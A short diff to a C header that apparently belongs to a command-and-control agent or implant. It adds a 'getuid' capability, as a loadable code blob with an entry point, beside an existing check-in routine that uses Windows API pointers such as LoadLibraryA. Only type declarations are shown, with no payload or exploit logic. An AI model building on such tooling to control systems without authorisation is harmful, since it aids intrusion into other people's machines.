@@ -76,6 +76,7 @@ void free_params(AgentParams *params);
 */
 
 typedef void (*CHECKIN_PICO)(CheckinRequest *req);
+typedef char *(*GETUID_PICO)();
 
 typedef struct {
     __typeof__(LoadLibraryA)   * LoadLibraryA;
@@ -88,6 +89,9 @@ typedef struct {
 	char        *CheckinPicoCode;
 	char        *CheckinPicoData;
 	CHECKIN_PICO CheckinPicoEntrypoint;
+	char        *GetuidPicoCode;
+	char        *GetuidPicoData;
+	GETUID_PICO  GetuidPicoEntrypoint;
 } AgentCapabilities;
 
 void load_picos(AgentCapabilities *cap);
